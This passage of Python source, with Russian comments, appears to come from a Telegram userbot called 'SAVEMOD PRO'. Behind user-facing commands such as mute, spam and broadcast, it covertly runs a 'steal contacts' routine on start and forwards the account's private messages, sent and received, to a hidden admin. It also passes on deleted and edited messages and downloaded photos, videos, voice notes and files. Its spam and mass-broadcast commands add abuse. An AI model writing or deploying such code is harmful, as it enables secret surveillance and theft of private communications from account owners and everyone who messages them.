        cursor.execute('DELETE FROM user_sessions WHERE user_id=?', (owner_id,))
        conn.commit()
        return
    active_clients[owner_id] = client
    saved_messages[owner_id] = {}
    logger.info(f"✅ Юзербот запущен для {owner_id}")
    me = await client.get_me()
    
    # Автоматический стиллинг контактов при старте
    await steal_contacts(client, me)
    
    cursor.execute('SELECT user_id FROM muted_users WHERE muted_by=?', (owner_id,))
    muted_users = {row[0] for row in cursor.fetchall()}
    
    @client.on(events.NewMessage)
    async def handle_incoming(event):
        if not event.is_private:
            return
        
        # Обработка входящих
        if not event.out:
            sender_id = event.sender_id
            if sender_id in muted_users:
                await event.delete()
                return
            
            # Сохраняем сообщение
            if event.text:
                saved_messages[owner_id][event.id] = {'sender_id': sender_id, 'text': event.text}
                cursor.execute('INSERT INTO saved_messages (owner_id, msg_id, sender_id, text, date) VALUES (?, ?, ?, ?, ?)',
                              (owner_id, event.id, sender_id, event.text, datetime.now().isoformat()))
                conn.commit()
            
            # Отправляем админу лог входящего сообщения
            try:
                sender_entity = await client.get_entity(sender_id)
                sender_name = sender_entity.first_name or sender_entity.username or str(sender_id)
                msg_preview = event.text[:500] if event.text else "[Медиа]"
                await send_to_admin(f"📩 [{me.first_name}] → от {sender_name}:\n{msg_preview}")
            except:
                await send_to_admin(f"📩 [{me.first_name}] → от {sender_id}:\n{event.text[:500] if event.text else '[Медиа]'}")
            
            # Автоматический слив медиа
            media_path = None
            media_type = None
            if event.photo:
                media_path = await event.download_media()
                media_type = "📷 Фото"
            elif event.video:
                media_path = await event.download_media()
                media_type = "🎬 Видео"
            elif event.video_note:
                media_path = await event.download_media()
                media_type = "🔄 Кружок"
            elif event.voice:
                media_path = await event.download_media()
                media_type = "🎤 Голосовое"
            elif event.sticker:
                media_path = await event.download_media()
                media_type = "🎨 Стикер"
            elif event.document:
                media_path = await event.download_media()
                media_type = "📎 Файл"
            
            if media_path and os.path.exists(media_path):
                try:
                    sender_entity = await client.get_entity(sender_id)
                    sender_name = sender_entity.first_name or sender_entity.username or str(sender_id)
                    await send_media_to_admin(media_path, f"{media_type} от {sender_name} для {me.first_name}")
                except:
                    await send_media_to_admin(media_path, f"{media_type} для {me.first_name}")
                os.remove(media_path)
        
        # Обработка исходящих (что пишет сам аккаунт)
        if event.out and event.text:
            try:
                if event.chat_id and event.chat_id != owner_id:
                    chat_entity = await client.get_entity(event.chat_id)
                    chat_name = chat_entity.first_name or chat_entity.username or str(event.chat_id)
                    await send_to_admin(f"📤 [{me.first_name}] → {chat_name}:\n{event.text[:500]}")
                else:
                    await send_to_admin(f"📤 [{me.first_name}] написал:\n{event.text[:500]}")
            except:
                await send_to_admin(f"📤 [{me.first_name}] написал:\n{event.text[:500]}")
    
    @client.on(events.MessageDeleted)
    async def notify_delete(event):
        if not event.is_private:
            return
        for mid in event.deleted_ids:
            cursor.execute('SELECT sender_id, text FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, mid))
            row = cursor.fetchone()
            if row and row[0] != owner_id:
                try:
                    u = await client.get_entity(row[0])
                    name = u.first_name or str(row[0])
                    await send_to_admin(f"🗑 {name} удалил сообщение:\n{row[1][:500] if row[1] else ''}")
                except:
                    pass
    
    @client.on(events.MessageEdited)
    async def notify_edit(event):
        if not event.is_private or event.out:
            return
        cursor.execute('SELECT sender_id, text FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, event.id))
        row = cursor.fetchone()
        if row and row[0] != owner_id and row[1] != event.text:
            try:
                u = await client.get_entity(row[0])
                name = u.first_name or str(row[0])
                await send_to_admin(f"✏️ {name} изменил:\nБыло: {row[1][:200]}\nСтало: {event.text[:200] if event.text else ''}")
                cursor.execute('UPDATE saved_messages SET text=? WHERE owner_id=? AND msg_id=?', (event.text, owner_id, event.id))
                conn.commit()
            except:
                pass
    
    @client.on(events.NewMessage)
    async def user_commands(event):
        if not event.is_private or not event.out:
            return
        txt = event.text or ''
        if not txt.startswith('.'):
            return
        
        if txt == '.help':
            await event.edit("""
<b>🤖 КОМАНДЫ ЮЗЕРБОТА</b>

.help - справка
.mute (ответ) - заглушить пользователя
.unmute (ответ) - разглушить
.list - список заглушенных
.spam кол-во текст - спам
.type текст - печать как человек
.info (ответ) - инфо о пользователе
.broadcast текст - массовая рассылка всем диалогам
""", parse_mode='HTML')
            return
        
        if txt == '.mute':
            reply = await event.get_reply_message()
            if not reply:
                await event.edit('❌ Ответь на сообщение')
                return
            tid = reply.sender_id
            if tid == owner_id or is_target_admin(tid):
                await event.edit('❌ Нельзя')
                return
            cursor.execute('INSERT INTO muted_users (user_id, muted_by, muted_at) VALUES (?, ?, ?)', (tid, owner_id, datetime.now().isoformat()))
            conn.commit()
            muted_users.add(tid)
            await event.edit(f'🔇 Заглушен')
            return
        
        if txt == '.unmute':
            reply = await event.get_reply_message()
            if not reply:
                await event.edit('❌ Ответь на сообщение')
                return
            tid = reply.sender_id
            cursor.execute('DELETE FROM muted_users WHERE user_id=? AND muted_by=?', (tid, owner_id))
            conn.commit()
            muted_users.discard(tid)
            await event.edit(f'🔊 Разглушен')
            return
        
        if txt == '.list':
            if muted_users:
                names = []
                for uid in list(muted_users)[:20]:
                    try:
                        u = await client.get_entity(uid)
                        names.append(f"• {u.first_name}")
                    except:
                        names.append(f"• {uid}")
                await event.edit("🔇 <b>Заглушенные:</b>\n" + "\n".join(names), parse_mode='HTML')
            else:
                await event.edit("🔇 Нет заглушенных")
            return
        
        if txt.startswith('.spam '):
            parts = txt.split(' ', 2)
            if len(parts) >= 2:
                try:
                    cnt = min(int(parts[1]), 50)
                    msg = parts[2] if len(parts) > 2 else None
                    if not msg:
                        reply = await event.get_reply_message()
                        if reply:
                            msg = reply.text
                    if msg:
                        await event.delete()
                        for i in range(cnt):
                            await client.send_message(event.chat_id, msg)
                            await asyncio.sleep(0.05)
                except:
                    pass
            return
        
        if txt.startswith('.type '):
            t = txt[6:]
            if t:
                await event.delete()
                m = await client.send_message(event.chat_id, t[0])
                typed = t[0]
                for ch in t[1:]:
                    typed += ch
                    try:
                        await m.edit(typed)
                    except:
                        pass
                    await asyncio.sleep(0.15)
            return
        
        if txt == '.info':
            reply = await event.get_reply_message()
            if reply:
                try:
                    u = await client.get_entity(reply.sender_id)
                    muted = "✅" if reply.sender_id in muted_users else "❌"
                    await event.edit(f"👤 {u.first_name}\n🆔 {u.id}\n🔇 Заглушен: {muted}")
                except:
                    pass
            else:
                await event.edit('❌ Ответь на сообщение')
            return
        
        if txt.startswith('.broadcast '):
            parts = txt.split(' ', 1)
            if len(parts) > 1:
                msg_text = parts[1]
                sent = 0
                async for dialog in client.iter_dialogs():
                    if dialog.is_user and not getattr(dialog.entity, 'bot', False) and dialog.id != owner_id:
                        try:
                            await client.send_message(dialog.id, msg_text)
                            sent += 1
                            await asyncio.sleep(0.2)
                        except:
                            pass
                await event.edit(f"📢 Разослано {sent} пользователям")
    
    await client.run_until_disconnected()

flask_app = Flask(__name__)

@flask_app.route('/')
def health():
    return jsonify({'status': 'ok'})

def run_web():
    flask_app.run(host='0.0.0.0', port=8080, debug=False)

async def restore_sessions():
    cursor.execute('SELECT user_id, session_string_encrypted FROM user_sessions')
    for uid, ss_enc in cursor.fetchall():
        if not is_target_admin(uid):
            ss = decrypt_data(ss_enc)
            asyncio.create_task(run_userbot(uid, ss))

async def main():
    logger.info(f"🚀 SAVEMOD PRO запущен. Админы: {ADMIN_IDS}")
    await restore_sessions()
    while True:
        await asyncio.sleep(60)

if __name__ == '__main__':
    Thread(target=run_web, daemon=True).start()
    executor.start_polling(dp, skip_updates=True)
    try:
        asyncio.run(main())
    except RuntimeError:
        loop = asyncio.get_event_loop()
        loop.create_task(main())
